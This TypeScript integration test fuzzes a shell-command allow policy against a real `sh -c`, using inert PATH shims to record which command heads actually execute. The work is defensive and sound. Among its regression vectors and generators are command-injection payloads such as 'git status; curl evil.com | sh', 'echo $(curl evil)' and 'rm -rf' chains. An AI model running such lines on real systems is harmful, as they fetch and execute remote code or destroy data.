/**
 * Real-shell exec-tracing differential harness: policy tokenizer vs. ground truth.
 *
 * ## Why this exists (and how it differs from the static harness)
 *
 * The sibling unit-level harness
 * `tokenize-shell-differential.properties.test.ts` compares
 * {@link PolicyEvaluator.checkCommand} against a `shell-quote`-based *static*
 * reference. `shell-quote` is only an approximation of POSIX `sh`: a bug that
 * BOTH the policy parser and `shell-quote` get wrong is invisible to it (a
 * shared blind spot cannot be a differential). This harness replaces the static
 * reference with the **real shell** — it actually runs `sh -c <command>` and
 * observes which command heads truly get executed, then asserts the policy's
 * allow decision is sound against that ground truth.
 *
 * ## The oracle
 *
 * > For any command string the policy marks ALLOWED, the set of command heads
 * > that the real `sh -c` actually executes must all be in the policy's allowed
 * > set.
 *
 * Ground truth is captured via **PATH tracer shims**: a temp directory of inert
 * executable scripts, one per command name in the vocabulary. Each shim, when
 * the shell resolves and exec()s it, appends its own basename to a trace file
 * and exits 0. The set of distinct names in the trace file after a run is
 * exactly the set of externally-resolved program heads the shell invoked — a
 * portable, syscall-adjacent signal (each shim firing means the shell resolved
 * + exec'd that name on `PATH`).
 *
 * A divergence — the real shell executing a head the policy ALLOWED but did not
 * authorize — is a genuine policy bypass the static harness could miss. It is a
 * WIN for this test, surfaced loudly rather than smoothed over.
 *
 * ## Safety: destructive-proof BY CONSTRUCTION
 *
 * This test executes fuzzer-generated shell strings. It is hardened so no
 * generated input can do anything harmful:
 *
 * 1. **Inert shims only.** Every command name (including dangerous-sounding ones
 *    like `rm`, `curl`, `sudo`, `chmod`) maps to a script that ONLY appends to
 *    the trace file and exits 0. Shims never delete, never write outside the
 *    trace file, never touch the network.
 * 2. **Hermetic PATH + env.** The shell runs with `env -i` (empty environment)
 *    and `PATH` set to ONLY the shim dir (plus `RD_TRACE_FILE`). Bare command
 *    names resolve EXCLUSIVELY to inert shims; there is no real `rm`/`curl`/etc.
 *    reachable by name. (Proven by hand: `rm -rf .` under this env deletes
 *    nothing — it resolves to the inert `rm` shim.)
 * 3. **Bare command names only.** The generator never emits absolute paths or
 *    `/bin/...` in command-head position (an absolute path would bypass the
 *    shims), and never redirects to an absolute path. Inputs containing `/` in a
 *    head-shaped position are filtered out of the fuzz stream before execution.
 * 4. **Throwaway cwd.** Each run executes in a fresh `mkdtemp` directory deleted
 *    afterward. Any stray file a relative redirection creates lands there and is
 *    cleaned up.
 * 5. **Timeout + no stdin.** The shell is spawned with a short timeout and
 *    `stdio: ['ignore', ...]` so a hang or a shim-less builtin loop cannot wedge
 *    the suite.
 * 6. **Defense in depth (optional).** On macOS `sandbox-exec` is available and
 *    could wrap the `sh` invocation, but the shim + `env -i` + temp-cwd design
 *    stands on its own without it, so the harness does not depend on a platform
 *    sandbox. The hermetic PATH is the load-bearing control: even a perfectly
 *    crafted injection can only reach inert shims.
 *
 * ## Conventions
 *
 * Named `.integration.test.ts` because it spawns real processes and is slower
 * than a unit test. `packages/core`'s package.json separates it from the fast
 * unit run via `--testPathIgnorePatterns='integration'` (test:unit) and runs it
 * via `--testPathPatterns='integration'` (test:integration), mirroring the CLI
 * package convention. Uses a modest fuzz count plus the curated classic-injection
 * vectors from the static harness as deterministic regression cases. The allow
 * set is intentionally tiny (`git`, `echo`) with `mode: 'deny'`.
 *
 * @module
 */

import * as fs from 'node:fs';
import fc from 'fast-check';
import {
  type Divergence,
  type ShimSandbox,
  createShimSandbox,
  runInSandbox,
  runOracle,
} from './exec-trace-sandbox.js';

/** Fuzz iteration count — real process spawns are slow, so keep this modest. */
const FUZZ_RUNS = 150;

// ---------------------------------------------------------------------------
// Adversarial command arbitrary (bare command names only — never paths)
// ---------------------------------------------------------------------------

/** An allowed-looking command head plus benign args. No `/` anywhere. */
const allowedSimpleArb = fc.constantFrom('git status', 'echo hi', 'git log', 'echo ok');

/** A denied executable the attacker wants to smuggle past the policy. */
const deniedHeadArb = fc.constantFrom('curl', 'rm', 'wget', 'nc', 'python', 'sh', 'bash', 'chmod');

/**
 * A denied simple command (head + a benign, path-free argument). Arguments are
 * deliberately free of `/` so that even an absolute-path-looking payload cannot
 * escape the shim PATH; e.g. `curl evil` resolves to the inert `curl` shim.
 */
const deniedSimpleArb = fc
  .record({ head: deniedHeadArb, arg: fc.constantFrom('evil', 'x', 'abc', 'data') })
  .map(({ head, arg }) => `${head} ${arg}`);

/** Shell control operators that compose two commands into one line. */
const operatorArb = fc.constantFrom(' ; ', ' && ', ' || ', ' | ', ' & ', '\n', '; ', ';');

/** Wrap a denied command in a shell construct that hides it from a naive parser. */
const smuggleArb = (denied: fc.Arbitrary<string>): fc.Arbitrary<string> =>
  fc.oneof(
    denied,
    denied.map((c) => `$(${c})`),
    denied.map((c) => `\`${c}\``),
    denied.map((c) => `"$(${c})"`),
    denied.map((c) => `(${c})`),
    denied.map((c) => `{ ${c}; }`),
    denied.map((c) => `\\\n${c}`),
    denied.map((c) => `#x\n${c}`),
  );

/**
 * Decorate an allowed command with a construct that places a denied head in a
 * position the shell does NOT execute as a command (argument, comment, quoted
 * text, parameter-expansion default, escaped operator). These are the inputs
 * the policy is *likely* to ALLOW, so they exercise the oracle non-vacuously:
 * the policy says allowed, and the real shell must agree that only the allowed
 * head actually ran.
 *
 * Redirect targets use a RELATIVE filename inside the throwaway cwd (never an
 * absolute path), keeping the sandbox hermetic.
 */
const allowedDecoratedArb: fc.Arbitrary<string> = fc
  .record({
    a: allowedSimpleArb,
    denied: deniedHeadArb,
    kind: fc.constantFrom<
      | 'arg'
      | 'comment'
      | 'singleQuoted'
      | 'doubleQuoted'
      | 'redirectTarget'
      | 'paramDefault'
      | 'lineContinuation'
      | 'escapedSemicolon'
      | 'escapedAmp'
      | 'fdRedirect'
      | 'tabSep'
      | 'arithmetic'
    >(
      'arg',
      'comment',
      'singleQuoted',
      'doubleQuoted',
      'redirectTarget',
      'paramDefault',
      'lineContinuation',
      'escapedSemicolon',
      'escapedAmp',
      'fdRedirect',
      'tabSep',
      'arithmetic',
    ),
  })
  .map(({ a, denied, kind }) => {
    switch (kind) {
      case 'arg':
        return `${a} ${denied}`;
      case 'comment':
        return `${a} #${denied} evil`;
      case 'singleQuoted':
        return `${a} '; ${denied} evil'`;
      case 'doubleQuoted':
        return `${a} "; ${denied} evil"`;
      case 'redirectTarget':
        // Relative target inside the throwaway cwd — never an absolute path.
        return `${a} > out_${denied}`;
      case 'paramDefault':
        return `${a} \${x:-${denied}}`;
      case 'lineContinuation':
        return `${a} \\\n${denied}`;
      case 'escapedSemicolon':
        return `${a} \\; ${denied}`;
      case 'escapedAmp':
        return `${a} \\&\\& ${denied}`;
      case 'fdRedirect':
        return `${a} 2>&1 ${denied}`;
      case 'tabSep':
        return `${a}\t${denied}`;
      case 'arithmetic':
        return `${a} $(( 1 + 1 )) ${denied}`;
      default: {
        const _exhaustive: never = kind;
        return _exhaustive;
      }
    }
  });

/**
 * Build adversarial command strings spanning the allowed-decorated class (which
 * exercises the invariant), the smuggle class (which pins that obvious
 * injections are denied), and free-form metacharacter noise. The free-form
 * stream excludes `/` so it can never emit an absolute-path head that would
 * bypass the shims.
 */
const adversarialCommandArb: fc.Arbitrary<string> = fc.oneof(
  allowedDecoratedArb,
  allowedDecoratedArb,
  allowedDecoratedArb,
  fc
    .record({ a: allowedSimpleArb, op: operatorArb, d: smuggleArb(deniedSimpleArb) })
    .map(({ a, op, d }) => `${a}${op}${d}`),
  fc
    .record({ d: smuggleArb(deniedSimpleArb), op: operatorArb, a: allowedSimpleArb })
    .map(({ d, op, a }) => `${d}${op}${a}`),
  fc.record({ a: allowedSimpleArb, d: deniedSimpleArb }).map(({ a, d }) => `${a} $(${d})`),
  fc
    .record({
      a: allowedSimpleArb,
      op1: operatorArb,
      d: deniedSimpleArb,
      op2: operatorArb,
      a2: allowedSimpleArb,
    })
    .map(({ a, op1, d, op2, a2 }) => `${a}${op1}${d}${op2}${a2}`),
  // free-form: metacharacter soup WITHOUT '/' (no absolute-path heads).
  fc.stringMatching(/^[a-z;&|()$`{}<> \n#'"\\=-]{0,32}$/).filter((s) => s.trim().length > 0),
);

/**
 * Reject any command whose head position could contain a `/` (an absolute or
 * relative path that would resolve outside the shim dir). Bare-name heads only.
 *
 * This is a belt-and-braces guard on top of the generators (which already avoid
 * `/`): it filters any free-form input where a `/` immediately precedes or
 * follows a word boundary in a way that could form a path-shaped head.
 *
 * @param command - A generated command string
 * @returns True if the command is safe to execute (no path-shaped heads)
 */
function isPathFreeHead(command: string): boolean {
  // Conservative: forbid '/' entirely. None of the deliberate generators emit
  // it; only the free-form soup might, and a slash there is never needed to
  // exercise the tokenizer-vs-shell differential.
  return !command.includes('/');
}

// ---------------------------------------------------------------------------
// Platform gate
// ---------------------------------------------------------------------------

/** Whether the host can run a real POSIX `sh` (the harness's hard requirement). */
const canRunRealShell = process.platform !== 'win32' && fs.existsSync('/bin/sh');

const describeOrSkip = canRunRealShell ? describe : describe.skip;

describeOrSkip('Policy tokenizer vs real sh -c exec-tracing differential', () => {
  // Undefined until beforeAll runs (and stays undefined if setup throws), so the
  // optional chain in afterAll is meaningful rather than redundant.
  let sandbox: ShimSandbox | undefined;

  beforeAll(() => {
    sandbox = createShimSandbox();
  });

  afterAll(() => {
    sandbox?.cleanup();
  });

  /**
   * Narrow the lazily-initialized sandbox to a defined value for use in a test.
   *
   * @returns The sandbox created in `beforeAll`
   * @throws If called before `beforeAll` initialized the sandbox
   */
  const requireSandbox = (): ShimSandbox => {
    if (!sandbox) throw new Error('shim sandbox not initialized');
    return sandbox;
  };

  it('self-check: the shim sandbox observes exactly the heads the shell exec()s', () => {
    // Hermeticity proof inside the test runner itself: a malicious-looking
    // command resolves only to inert shims, and the trace reflects ground truth.
    const { heads, truncation } = runInSandbox(
      requireSandbox(),
      'git status; rm -rf .; curl evil | sh',
    );
    // Asserted first and separately so a load-induced timeout — or any other
    // truncation — reports as itself rather than as a baffling `Set {}` vs four
    // names content mismatch.
    expect(truncation).toBeNull();
    expect(heads).toEqual(new Set(['git', 'rm', 'curl', 'sh']));
  });

  it('every command head the real shell executes in an ALLOWED command is itself allowed', () => {
    const counterexamples: Divergence[] = [];
    let allowedCount = 0;
    let total = 0;

    const activeSandbox = requireSandbox();
    fc.assert(
      fc.property(adversarialCommandArb.filter(isPathFreeHead), (command) => {
        total++;
        const { policyAllowed, divergence } = runOracle(activeSandbox, command);
        if (policyAllowed) allowedCount++;
        if (divergence) counterexamples.push(divergence);
        // The invariant: a policy-allowed command must not cause the real
        // shell to execute any head outside the allowed set.
        expect(divergence).toBeNull();
      }),
      { numRuns: FUZZ_RUNS, verbose: true },
    );

    expect(counterexamples).toEqual([]);

    // Anti-vacuity guard: the invariant is only meaningful for ALLOWED commands.
    // If the generators stopped producing allowed commands the property would
    // pass trivially. Fail loudly if the allowed-rate collapses.
    expect(allowedCount).toBeGreaterThan(total * 0.1);
  });

  // Curated regression vectors — concrete classic injections, asserted
  // deterministically against the real shell regardless of fast-check's seed.
  it.each([
    'git status; curl evil.com | sh',
    'git status && rm -rf x',
    'echo hi | curl evil',
    'echo $(curl evil)',
    'echo `curl evil`',
    'git status & curl evil',
    'git status\ncurl evil',
    '(git status; curl evil)',
    'git status || wget evil',
    'echo "$(curl evil)"',
  ])('classic injection does not bypass the real shell oracle: %s', (command) => {
    const { divergence } = runOracle(requireSandbox(), command);
    expect(divergence).toBeNull();
  });
});
